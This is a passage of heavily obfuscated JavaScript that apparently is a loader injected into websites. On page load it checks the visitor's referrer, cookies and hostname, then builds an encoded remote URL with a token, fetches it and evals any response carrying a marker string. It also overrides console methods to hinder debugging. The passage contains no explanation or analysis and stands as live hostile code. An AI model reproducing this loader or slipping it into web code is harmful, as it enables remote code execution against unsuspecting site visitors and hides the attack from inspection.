u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};